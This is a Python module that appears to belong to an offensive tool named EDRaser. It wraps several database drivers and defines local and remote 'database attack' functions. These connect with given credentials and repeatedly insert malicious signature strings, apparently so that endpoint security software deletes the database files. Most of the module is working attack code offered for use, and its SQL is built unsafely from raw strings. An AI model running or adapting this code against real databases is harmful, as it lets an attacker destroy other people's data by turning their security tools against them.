import logging

SAMPLE_TABLE_NAME   = "EDRaser_SAMPLE_TABLE"
SAMPLE_DB_NAME      = "EDRaser_SAMPLE_DB"

SUPPORTED_DBs = ['sqlite', 'mysql', 'mariadb', "postgres"]
DB_INSERTION_NUM    = 256

class Database:
    def __init__(self, database_type: str, host: str = "localhost", port: int = 3306 , username: str = None, password: str = None, database_name: str = None):

        if database_type.lower() not in SUPPORTED_DBs:
            raise TypeError(f"Error: {database_type} not supported.\nSupported DB's: {SUPPORTED_DBs}")
        
        self.database_type = database_type
        self.database_name = database_name
        self.table = None 
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.connection = None

    def connect(self):
            if self.database_type == 'mariadb':
                import mariadb
                self.connection = mariadb.connect(
                            host= self.host,
                            port= int(self.port),
                            user= self.username,
                            password= self.password)
                
            elif self.database_type == 'mysql' or self.database_type == 'mariadb':
                import mysql.connector
                try:
                    if self.database_name:
                        self.connection = mysql.connector.connect(
                            host= self.host,
                            port= self.port,
                            user= self.username,
                            password= self.password,
                            database= self.database_name)
                    else:
                        self.connection = mysql.connector.connect(
                            host= self.host,
                            port= self.port,
                            user= self.username,
                            password= self.password)
                        
                except Exception as e:
                    raise ConnectionError(f"Failed to connect to {self.database_type} DB with the following connection string: {self.username}:{self.password}@{self.host}:{self.port}\n{e}")

            elif self.database_type == 'postgres':
                import psycopg2
                try:
                    self.connection = psycopg2.connect(
                        host= self.host,
                        port= self.port,
                        user= self.username,
                        password= self.password,
                        database= self.database_name
                    )
                    self.connection.autocommit = True
                except Exception as e:
                    raise ConnectionError(f"Failed to connect to {self.database_type} DB with the following connection string: {self.username}:{self.password}@{self.host}:{self.port}\n{e}")
                
            elif self.database_type == 'sqlite':
                import sqlite3
                if self.host == 'localhost':
                    self.connection = sqlite3.connect(self.database_name, check_same_thread=False)
                else:
                    raise TypeError("[-] Error: SQLite is not remote DB")

    def flush_db_to_disk(self):
        if self.database_type == 'postgres':
            return

        logging.info(f"Flushing {self.table} to disk")
        self._run_SQL_command(f"FLUSH TABLES")

    def create_sample_database(self):
        # Note that sqlite does not require explicit database creation 
        logging.info(f"Creating new DB: {SAMPLE_DB_NAME}")
        if not self.connection:
            self.connect()

        if self.database_type == 'mysql' or self.database_type == 'mariadb':
            self._mysql_create_sample_database(SAMPLE_DB_NAME)
        elif self.database_type == 'postgres':
            self._postgres_create_sample_database(SAMPLE_DB_NAME)
        
        
        self.database_name = SAMPLE_DB_NAME
        # Can add support for other databases here
    
    def create_table(self, table_name: str, columns: dict):
        if not self.connection:
            self.connect()
        try:

            if self.database_type  in ['mysql', 'sqlite', 'mariadb', 'postgres']:
                self._sql_create_table(table_name, columns)
        except Exception as e:
            logging.error(e)

        self.table = table_name
        logging.info(f"Create table: {table_name}")
        # Add support for other databases here
    
    def is_database_exists(self, database_name: str):
        res =  self._run_SQL_command(f"SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME = '{database_name}'")
        len(res) > 0
    
    def is_table_exists(self, table_name: str):
        res =  self._run_SQL_command(f"SELECT count(*) FROM information_schema.tables WHERE table_name = '{table_name}'")
        return res[0][0] > 0

    def insert(self, table_name: str, data: dict):
        if not self.connection:
            self.connect()
        
        if not self.table:
            self.table = table_name

        if self.database_type in ['mysql', 'mariadb', 'sqlite', 'postgres']:
            self._sql_insert(table_name, data)

        # Add support for other databases here

    def set_table(self, table_name: str):
        self.table = table_name

    def fetch_data(self):
        if not self.connection:
            self.connect()
        data = self._run_SQL_command(f"SELECT * FROM {self.table}")
        return data

    def _postgres_create_sample_database(self, db_name: str):
        try:
            self._run_SQL_command(f"CREATE DATABASE {db_name} ")
        except Exception as e:
            logging.error(e)

    def _mysql_create_sample_database(self, db_name: str):
        try:
            self._run_SQL_command(f"CREATE DATABASE IF NOT EXISTS {db_name} ")
            self._run_SQL_command(f"USE {db_name}")
        except Exception as e:
            logging.error(e)

    def _run_SQL_command(self, command_to_run: str):
        res_data = None
        try:
            cursor = self.connection.cursor()
            cursor.execute(command_to_run)
            if "select" in command_to_run.lower():
                res_data = cursor.fetchall()
            self.connection.commit()
            cursor.close()
        except Exception as e:
            logging.error(e)
            pass

        return res_data

    def _sql_create_table(self, table_name: str, columns: dict):
        column_definitions = ', '.join([f"{column_name} {column_type}" for column_name, column_type in columns.items()])

        # In case of MYD format: query = f"CREATE TABLE {table_name} ({column_definitions}) ENGINE = MYISAM"
        query = f"CREATE TABLE {table_name} ({column_definitions})"
        try:
            self._run_SQL_command(query)
        except Exception as e:
            logging.error(e)
        
    def _sql_insert(self, table_name: str, data: dict):
        cursor = self.connection.cursor()
        if self.database_type == "sqlite":
            placeholders = ', '.join(['?'] * len(data))
        else:
            placeholders = ', '.join(['%s'] * len(data))
            
        columns = ', '.join(data.keys())
        values = tuple(data.values())
        query = f"INSERT INTO {table_name} ({columns}) VALUES ({placeholders})"
        cursor.execute(query, values)
        self.connection.commit()
        cursor.close()


def run_local_database_attack(db_name: str, table_name: str , signature_DB: list):
    """
    Creates a simple sqlite DB on the disk and write malicous strings into the DB.
    """
    table_name = table_name or SAMPLE_TABLE_NAME
    db_name = db_name or SAMPLE_DB_NAME
    logging.info("Running local database attack")
    sqlite_db = Database("sqlite", database_name= db_name)
    sqlite_db.connect()
    sqlite_db.create_table(table_name,
                           {"id": "INTEGER PRIMARY KEY",
                            "name": "VARCHAR(65535)"})
    
    for signature in signature_DB:
        sqlite_db.insert(table_name, {"name": signature.get_signature_data()})

def run_remote_database_attack(signature_DB: list ,  DB_type: str , username: str , password: str, host: str, port: int, DB_name: str = None, table_name: str = None):
    """
    Connecting into a remote DB with the given credintials, and performing inseting malicous signatures attack.
    
    :param ip: The IP address of the web server.
    :param port: The port number the web server, defualt = 80.
    :param log_insertion: The amount of times send the request to the web server, defualt = 10.
    """

    logging.info(f"Running remote database attack on {username}@{host}:{port}")
    remote_db = Database(DB_type, host,  port, username, password, DB_name)

    try:
        remote_db.connect()
    except Exception as e:
        logging.error(f"Error when tried to connect to the DB: {e}")
        logging.error(f"Make sure that remote connection to the DB is allowed")
        return
    
    logging.info("Sucussfully connected to remote DB")

    if not DB_name:
        remote_db.create_sample_database()
    
    if not table_name:
        remote_db.create_table(SAMPLE_TABLE_NAME,
                            {"id": "INTEGER",
                             "name": "BLOB(4096)"})

    try:
        for signature in signature_DB:
            for i in range(DB_INSERTION_NUM):
                remote_db.insert(table_name or SAMPLE_TABLE_NAME, {"id":i, "name": signature.get_signature_data()})
                
            remote_db.flush_db_to_disk()
            logging.info(f"Inserted {DB_INSERTION_NUM} malicous strings to DB")

    except Exception as e:
        logging.error(e)
    
    logging.info("Done")